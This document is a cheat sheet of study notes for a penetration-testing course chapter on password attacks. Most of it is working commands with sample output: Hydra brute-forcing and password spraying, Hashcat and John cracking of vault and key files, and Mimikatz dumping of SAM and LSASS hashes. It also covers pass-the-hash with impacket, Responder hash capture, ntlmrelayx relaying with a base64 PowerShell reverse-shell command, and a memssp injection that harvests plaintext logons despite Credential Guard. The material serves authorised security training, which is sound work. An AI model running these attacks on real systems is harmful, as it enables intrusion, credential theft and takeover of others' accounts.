# Password Attacks Cheat Sheet (PEN-200, Ch. 16)

Covers: attacking network service logins, password cracking fundamentals (wordlist mutation, cracking methodology), and Windows NTLM / Net-NTLMv2 hash attacks (cracking, pass-the-hash, relaying, Credential Guard bypass).

Simple password auth remains the dominant real-world auth mechanism — most real breaches come from client-side or password attacks, not technical exploits.

---

## 16.1 Attacking Network Service Logins

Dictionary attacks against network services and HTTP login forms using **THC Hydra** and the **rockyou.txt** wordlist (14M+ passwords, pre-installed on Kali, gzip-compressed — `sudo gzip -d rockyou.txt.gz`).

> Dictionary attacks generate a lot of noise (logs/events/traffic) and can trigger account lockout policies (e.g. lockout after 3 failed attempts) — lock out real users on a live pentest. Enumerate thoroughly and understand lockout policy before firing broad-range attacks.

### 16.1.1 SSH

```bash
# Confirm target service/port first
sudo nmap -sV -p 2222 192.168.50.201

# Unzip rockyou if needed
sudo gzip -d rockyou.txt.gz

# Single-username dictionary attack against SSH on non-standard port
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
# -l = single login name, -P = password wordlist, -s = port
# Result: [2222][ssh] host: 192.168.50.201 login: george password: chocolate
```

If usernames are unknown, fall back to enumeration/OSINT, or target built-in accounts (`root` on Linux, `Administrator` on Windows).

### 16.1.2 RDP — Password Spraying

Password spraying = one (likely) password against many usernames. Sources for that one password: prior compromises, plaintext files found on a host, or breach/leak databases (e.g. ScatteredSecrets — check legality/ToS before use; **WeLeakInfo was seized by the FBI/DOJ** for alleged illegal activity, so vet any such service carefully).

```bash
# Append candidate usernames to a small wordlist
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

# Spray one password across a username list against RDP
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
# -L = username list, -p = single password
# Result: valid creds for both daniel and justin
```

Always try leveraging any plaintext password discovered elsewhere by spraying it broadly — may reveal password reuse across systems.

### 16.1.3 HTTP POST Login Forms

Harder than SSH/RDP — Hydra needs the **POST body format** and a **failed-login identifier string**.

Workflow:
1. Intercept a login attempt in **Burp** to capture the POST request body (username/password field names).
2. Submit an intentionally-wrong login and capture the failure message text shown in the response.
3. Build the Hydra `http-post-form` target string: `"<path>:<body-with-^USER^/^PASS^>:<failure-string>"`.

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# Result: [80][http-post-form] host: 192.168.50.201 login: user password: 121212
```

> When defining the failure condition string, avoid generic words like `password` or `username` — shorten it to something unique in the failure response to reduce false positives.

- Most web apps ship a **default admin account** — try it first, it dramatically shortens attack time.
- Watch for **Web Application Firewalls (WAF)** — may trigger rate limiting/blocking on noisy dictionary attacks against login forms.

---

## 16.2 Password Cracking Fundamentals

### 16.2.1 Introduction to Encryption, Hashes and Cracking

- **Encryption** = two-way (reversible with a key). **Symmetric** (same key both ways, e.g. AES) vs **Asymmetric** (public/private keypair, e.g. RSA).
- **Hashing** = one-way function on variable-length input → fixed-length output (a *digest*). Used to store passwords so admins/attackers can't read them directly; login compares hash-of-input to stored hash.
- **Password cracking** = hashing many candidate plaintexts and comparing to a target hash (since hashes can't be reversed directly).
- Two main tools:
  - **Hashcat** — primarily GPU-based (needs OpenCL/CUDA), also supports CPU.
  - **John the Ripper (JtR)** — primarily CPU-based, also supports GPU. Runs with no extra drivers.
  - Slow algorithms (e.g. **bcrypt**) work better on CPU than GPU.

Manual hash-check example:
```bash
echo -n "secret" | sha256sum
echo -n "secret1" | sha256sum
# compare output to captured hash 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d
# match found -> plaintext is "secret1"
```

**Keyspace & cracking time** = keyspace ÷ hash rate. Keyspace = (charset size) ^ (password length).

```bash
# Count charset size (62 = a-z, A-Z, 0-9)
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
# 62

python3 -c "print(62**5)"     # keyspace for 5-char password -> 916132832
python3 -c "print(62**8)"     # 8-char -> 218340105584896
python3 -c "print(62**10)"    # 10-char -> 839299365868340224
```

Benchmark hash rates (CPU vs GPU):
```bash
hashcat -b            # CPU/GPU benchmark, all modes (MD5=0, SHA1=100, SHA2-256=1400, etc.)
```

| Algorithm | GPU rate (example) | CPU rate (example) |
|---|---|---|
| MD5 | 68,185.1 MH/s | 450.8 MH/s |
| SHA1 | 21,528.2 MH/s | 298.3 MH/s |
| SHA256 | 9,276.3 MH/s | 134.2 MH/s |

```bash
python3 -c "print(916132832 / 134200000)"     # cracking time (sec), 5-char, CPU SHA256 -> ~6.8s
python3 -c "print(916132832 / 9276300000)"    # same, GPU -> ~0.1s
python3 -c "print(839299365868340224 / 9276300000)"  # 10-char, GPU -> ~90.5M sec (~2.8 yrs)
```

> Increasing password **length** grows cracking time **exponentially**; increasing password **complexity/charset** only grows it **polynomially**. A policy mandating longer passwords is more effective against cracking than one mandating more character classes.

### 16.2.2 Mutating Wordlists

Most wordlist entries won't satisfy real password policies (min length, upper/lower/number/special char). Instead of manually editing huge lists, use **rule-based attacks**: rule files containing **rule functions** that mutate each wordlist entry on the fly.

```bash
mkdir passwordattacks && cd passwordattacks
head /usr/share/wordlists/rockyou.txt > demo.txt
sed -i '/^1/d' demo.txt          # strip lines starting with "1" (removes pure-numeric entries)
```

| Rule function | Effect |
|---|---|
| `$X` | append character `X` to the end |
| `^X` | prepend character `X` to the beginning |
| `c` | capitalize first char, lowercase the rest |

```bash
# Single rule function - append "1"
echo \$1 > demo.rule
hashcat -r demo.rule --stdout demo.txt      # --stdout = debug mode, prints mutated list, doesn't crack

# Multiple functions on ONE line = applied together to every word
cat demo1.rule    # e.g.: $1 c
hashcat -r demo1.rule --stdout demo.txt     # -> "Rockyou1", "Abc1231" (capitalized AND suffixed)

# Multiple functions on SEPARATE lines = each line is its own independent rule/output
cat demo2.rule    # e.g.: $1  /  c   (two lines)
hashcat -r demo2.rule --stdout demo.txt     # -> two mutated variants per word ("password1" AND "Password")

# Combine append + capitalize + special char (order matters)
cat demo1.rule    # $1 c $!
hashcat -r demo1.rule --stdout demo.txt     # -> "Password1!"
```

> Watch out for the Hashcat error **"Not enough allocatable device memory for this attack"** — shut down the Kali VM and increase RAM (4GB is enough for course exercises).

Real cracking example combining wordlist + custom rule:
```bash
cat crackme.txt        # f621b6c9eab51a3e2f4e167fee4c6860  (MD5 hash)
cat demo3.rule
# $1 c $!
# $2 c $!
# $1 $2 $3 c $!

hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
# -m 0 = MD5 mode. Result: f621b6c9eab51a3e2f4e167fee4c6860:Computer123!
```
(`--force` needed on Kali VMs lacking GPU access, to bypass Hashcat's warning.)

**Human password behavior to model in rules:** most users take a base word, capitalize the first letter (when uppercase required), append numbers, and append special characters at the end using easy-to-reach left-side-of-keyboard characters (`!`, `@`, `#`).

Predefined rule files ship with Hashcat — useful when you don't know the target's password policy:
```bash
ls -la /usr/share/hashcat/rules/
# best66.rule, combinator.rule, d3ad0ne.rule, dive.rule, generated.rule, generated2.rule,
# Incisive-leetspeak.rule, InsidePro-HashManager.rule, InsidePro-PasswordsPro.rule,
# leetspeak.rule, oscommerce.rule, rockyou-30000.rule, specific.rule,
# T0XlC-insert_00-99_1950-2050_toprules_0_F.rule, hybrid/ ...
```

### 16.2.3 Cracking Methodology

Five-step process for real-world cracking sessions:
1. **Extract hashes** (e.g. dump a compromised DB table).
2. **Format hashes** — identify hash type with `hash-identifier` or `hashid` (both on Kali); convert to the cracking tool's expected format if needed.
3. **Calculate the cracking time** — keyspace ÷ hash rate; abandon/rescope if it exceeds the remaining engagement time.
4. **Prepare wordlist** — prefer a mutated (rule-based) wordlist over a straight dictionary; research the target's password policy and leak sites.
5. **Attack the hash.**

> **Tip:** Consider hardware upgrades or cloud-based compute instances for long-running cracking sessions.

> An extra space or newline in a hash file can break the expected format — carefully check hash formatting, especially after copy/paste.

### 16.2.4 Password Manager (KeePass Database)

Scenario: GUI access to a workstation running a password manager (e.g. **KeePass**, **1Password**). Extract the vault file, convert to a Hashcat-compatible hash, crack the master password.

```powershell
# Locate KeePass database files from a foothold
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
# Transfer Database.kdbx to Kali, then convert with JtR's helper script
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
# Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*...

# Remove the "Database:" filename prefix that keepass2john prepends (KeePass has no username)
# -> edit file, leaving just: $keepass$*2*60*0*...

# Find the correct Hashcat mode
hashcat --help | grep -i "KeePass"
# 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager

# Crack with a predefined rule + rockyou
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force
# Result: ...:qwertyuiop123!
```

> `keepass2john` inserts the source filename as a pseudo-"username" before the hash (helpful for DB dumps with real usernames) — strip it for KeePass since there's no associated username, just a master password.

### 16.2.5 SSH Private Key Passphrase

Scenario: obtained an SSH private key (`id_rsa`) — e.g. via a Directory Traversal vuln on a web app — but it's passphrase-protected.

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 dave@192.168.50.201
# Prompts "Enter passphrase for key 'id_rsa':" — wrong guesses just re-prompt (SSH won't echo the passphrase)
```

Apply the cracking methodology:
```bash
# Step 2: format the key as a hash
ssh2john id_rsa > ssh.hash
cat ssh.hash
# id_rsa:$sshng$6$16$...   ("$6$" == SHA-512 KDF)
# Strip the "id_rsa:" filename prefix before the first colon

# Step 2 (cont'd): find the Hashcat mode
hashcat -h | grep -i "ssh"
# 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$) | Private Key
```

```bash
# Step 4: build a targeted wordlist + rule from OSINT (e.g. a found note.txt with a colleague's password habits)
cat ssh.rule
# c $1 $3 $7 $!
# c $1 $3 $7 $@
# c $1 $3 $7 $#

cat ssh.passwords
# Window
# rickc137
# dave
# superdave
# megadave
# umbrella

# Step 5: attack (Hashcat attempt)
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
# May fail: "Token length exception" — some modern private-key ciphers (aes256-ctr) aren't supported by Hashcat mode 22921
```

> Reinforces using **multiple tools** — if Hashcat can't handle a cipher, fall back to **John the Ripper**.

```bash
# JtR requires named custom rules added to /etc/john/john.conf under a [List.Rules:<name>] header
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
# Manually wrap with header before appending, e.g.:
#   [List.Rules:sshRules]
#   c $1 $3 $7 $!
#   c $1 $3 $7 $@
#   c $1 $3 $7 $#

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# Result: Umbrella137!    (?)
# Use `john --show ssh.hash` to reliably re-display cracked results

ssh -i id_rsa -p 2222 dave@192.168.50.201
# Enter passphrase: Umbrella137!  -> shell access
```

---

## 16.3 Working with Password Hashes

Windows hash implementations covered: **NTLM** (local, stored in SAM) and **Net-NTLMv2** (network authentication protocol).

### 16.3.1 Cracking NTLM

- Local Windows user passwords are hashed and stored in the **SAM** (Security Account Manager) database: `C:\Windows\system32\config\sam`. Locked by the kernel while Windows is running — can't just copy it live.
- NTLM hashes in the SAM are **not salted** → vulnerable to precomputed **Rainbow Table** attacks (rainbow table = precomputed hash→plaintext lookup table).
- **LSASS** (Local Security Authority Subsystem) process caches NTLM hashes/credentials in memory; requires **SYSTEM**-level access to read.

> "NTLM hash" formally = **NTHash**; "Net-NTLMv2" formally = **NTLMv2**. The course uses the informal, industry-common names to avoid confusion.

> Enterprises still widely use NTLM for Windows devices; NTLM is **not the same thing as PINs**.

**Mimikatz** extracts hashes/plaintext creds and enables pass-the-hash. Requires Administrator+ and **SeDebugPrivilege**. Its `sekurlsa` module reads LSASS memory.

```powershell
# Enumerate local users first
Get-LocalUser
```

```
mimikatz # privilege::debug              # enable SeDebugPrivilege
mimikatz # token::elevate                # elevate token to NT AUTHORITY\SYSTEM (needs SeImpersonatePrivilege, default for local admins)
mimikatz # lsadump::sam                  # dump NTLM hashes from the SAM (lighter output than sekurlsa::logonpasswords)
# RID: 000003ea (1002)  User: nelly  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```

(Alternative privilege escalation to SYSTEM: **PsExec**, or Mimikatz's built-in token elevation function.)

```bash
# Save hash, ID the mode, crack it
echo "3ae8e5f0ffabb3a627672e1600f1ba10" > nelly.hash
hashcat --help | grep -i "ntlm"
# 1000 | NTLM | Operating System

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best66.rule --force
# Result: 3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
```

| Hashcat mode | Hash type |
|---|---|
| 1000 | NTLM (OS) |
| 5500 | NetNTLMv1 / NetNTLMv1+ESS |
| 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) |
| 5600 | NetNTLMv2 |
| 27100 | NetNTLMv2 (NT) |

### 16.3.2 Passing NTLM (Pass-the-Hash)

**Pass-the-hash (PtH)**: authenticate using `username:NTLM hash` instead of a plaintext password. Works because NTLM hashes are unsalted and static across sessions — a hash captured on one host can authenticate to any other host with a matching username+password (e.g. shared local Administrator credentials across a fleet).

> **UAC remote restrictions** (default since Windows Vista) block non-Administrator local admin-group members from getting code execution remotely — PtH for code execution generally requires the actual **local Administrator** account, not just any admin-group member.

```bash
# 1) SMB access with a hash via smbclient (escape backslashes in the UNC path)
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
smb: \> dir
smb: \> get secrets.txt
```

```bash
# 2) Interactive/command shell via impacket (LMHash left as zeros since only NTHash is used)
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
# psexec.py drops+registers a service exe -> shell always returns as SYSTEM

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
# wmiexec.py -> shell runs as the AUTHENTICATED user (not always SYSTEM)
```

Other PtH-capable tools/protocols: **CrackMapExec/NetExec** (SMB enum+mgmt), impacket `psexec.py`/`wmiexec.py`, RDP/WinRM (if rights allow), Mimikatz itself.

### 16.3.3 Obtaining and Cracking Net-NTLMv2

When you have unprivileged code execution only (no Mimikatz/SAM access), abuse the **Net-NTLMv2** network auth protocol: get the target to authenticate to a system you control, capture the challenge/response hash, then crack it offline.

- **Responder** runs a fake SMB (and HTTP/FTP) server plus **LLMNR / NBT-NS / MDNS poisoning** (MITRE **T1557**) to capture Net-NTLMv2 hashes.

```bash
ip a                                  # identify listening interface
sudo responder -I tap0                # -I = interface to listen on
```

```
# From the victim's shell, force an SMB auth attempt against your Responder host
dir \\192.168.119.2\test
```

```
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:0101...
```

```bash
hashcat -hh | grep -i "ntlm"     # confirm mode 5600 = NetNTLMv2
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
# Result: password recovered for paul
```

> Even a low-privileged, non-admin foothold is enough to coerce SMB auth attempts against your Responder listener (e.g. simply running `dir` / `ls` against a UNC path you control) — no admin rights needed to *trigger* the capture, only to poison/listen.

### 16.3.4 Relaying Net-NTLMv2

Instead of cracking a captured Net-NTLMv2 hash offline, **relay** the live authentication attempt straight through to a second target in real time — works even against strong/uncrackable passwords, since you never need the plaintext.

> If not using the local Administrator account for the relay, **UAC remote restrictions must be disabled** on the target or command execution will fail. With UAC remote restrictions enabled, only the true local Administrator account works for relay (same constraint as PtH).

```bash
# impacket-ntlmrelayx: stand up a relay SMB server, forward auth to -t target, run -c command as the relayed user
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 \
  -c "powershell -enc JABjAGwAaQBlAG4AdA..."
# --no-http-server: disable HTTP listener since relaying SMB
# -smb2support: add SMB2 support
# -t: relay target
# -c: command executed on the target as the relayed user (base64 PowerShell reverse-shell one-liner here)
```

```bash
nc -nvlp 8080                          # catch the reverse shell triggered by -c
```

```
# From victim shell: trigger an SMB auth attempt against the relay listener
dir \\192.168.119.2\test
```

```
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] Executed specified command on host: 192.168.50.212
```

Relay result executes as the relayed user's privilege level on the second target (can land SYSTEM via the service-execution path, same as psexec-style access).

### 16.3.5 Windows Credential Guard

Domain-account credential caching differs from local accounts: instead of the SAM, domain hashes live in **lsass.exe process memory**. Mimikatz's `sekurlsa::logonpasswords` (needs Administrator+ and SeDebugPrivilege) dumps them when unprotected:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# ... User Name: Administrator  Domain: CORP  NTLM: 160c0b16dd0ee77e7c494e38252f7ddf ...
```

```bash
# Pass-the-hash the recovered domain admin hash to another domain box
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf \
  CORP/Administrator@192.168.50.248
```

**Windows Credential Guard** (built on **Virtualization-Based Security / VBS**) mitigates this:
- VBS uses **Hyper-V** to create isolated memory regions via **Virtual Secure Mode (VSM)**, split into **Virtual Trust Levels**: **VTL0** (normal OS) and **VTL1** (Secure Mode — isolated environment for critical functions, containing **Trustlets/IUM** processes).
- With Credential Guard on, LSASS's sensitive functions move into an isolated **LSAISO.exe** (LSA Isolated) trustlet in VTL1; VTL0 LSASS.exe just proxies to it over an RPC-like channel. Cached hashes/creds are only ever decrypted inside VTL1 — `sekurlsa::logonpasswords` in VTL0 can no longer see them.
- Premiered in Windows 10 / Server 2016 but **not enabled by default** historically — many enterprise machines still lack it. Newer/freshly-installed systems increasingly ship it enabled by default as Microsoft prioritizes security; **in-place upgrades preserve the prior enabled/disabled state**.

```powershell
Get-ComputerInfo
# DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
```

> Credential Guard only protects **non-local (domain) accounts** — local-account NTLM hashes on the same box remain extractable exactly as before.

**Bypass approach:** since cached hashes are unreachable, intercept credentials **at logon time** instead, by hijacking the **SSP (Security Support Provider)** interface (part of Windows' **SSPI**/LSA authentication stack — SSPs are loaded by lsass.exe from `HKLM\System\Control\Lsa\Security Packages` at boot). Mimikatz's `misc::memssp` injects a malicious SSP directly into lsass.exe memory (no DLL dropped to disk) that captures **plaintext** creds passed through SSPI during the next login.

```
mimikatz # privilege::debug
mimikatz # misc::memssp
# Injected =)
```

Then wait for (or socially-engineer) another interactive logon, and read the captured plaintext:
```powershell
type C:\Windows\System32\mimilsa.log
# [00000000:00af2311] CORP\Administrator QWERTY123!@#
```

> memssp logs **every** SSP-negotiated login (including machine-account `$` logons, mostly noise) — filter mimilsa.log for the real human credential lines.

---

## Key Takeaways / Workflow Summary

1. **Network service logins (16.1):** confirm the service/port → Hydra dictionary attack (`-l`/`-P` single user, `-L`/`-p` for spraying) → for HTTP forms, capture POST body + failure string in Burp first, then use `http-post-form` with `^USER^`/`^PASS^`. Watch for lockouts/WAFs — this is a noisy technique.
2. **Password cracking fundamentals (16.2):** know Hashcat (GPU-first) vs JtR (CPU-first); calculate keyspace÷hashrate before committing time; mutate wordlists with rule functions (`$`, `^`, `c`) modeling real human habits, or use Hashcat's bundled `/usr/share/hashcat/rules/`; follow the 5-step methodology (extract → format/ID mode → estimate time → prepare mutated wordlist → attack); use `*2john` helper scripts (`keepass2john`, `ssh2john`, etc.) to convert artifacts into Hashcat/JtR hash formats; switch tools (Hashcat ↔ JtR) when one can't parse a hash/cipher.
3. **NTLM (16.3.1–16.3.2):** SAM hashes are unsalted — extract with Mimikatz (`privilege::debug` → `token::elevate` → `lsadump::sam`), crack offline (mode 1000), or skip cracking entirely and **pass-the-hash** (`smbclient`, `impacket-psexec`/`wmiexec`, CrackMapExec) — remember UAC remote restrictions generally require the true local Administrator account.
4. **Net-NTLMv2 (16.3.3–16.3.4):** as an unprivileged user, coerce SMB auth with `dir \\<attacker-ip>\share`, capture with `sudo responder -I <iface>` (mode 5600 to crack), or go live and **relay** the auth with `impacket-ntlmrelayx` straight into command execution on a second host.
5. **Credential Guard (16.3.5):** domain creds live in isolated VTL1 memory (LSAISO.exe) once Credential Guard/VBS is on, blocking `sekurlsa::logonpasswords`; local-account hashes are unaffected. Bypass by hijacking the SSP chain at logon time with Mimikatz `misc::memssp`, then harvest plaintext from `mimilsa.log` after the next interactive logon.
6. Across every stage: identify the hash type (`hash-identifier`/`hashid`, `hashcat --help | grep -i <name>`), confirm the Hashcat/JtR mode number, and always weigh **crack vs. pass/relay** — passing/relaying sidesteps password strength entirely.
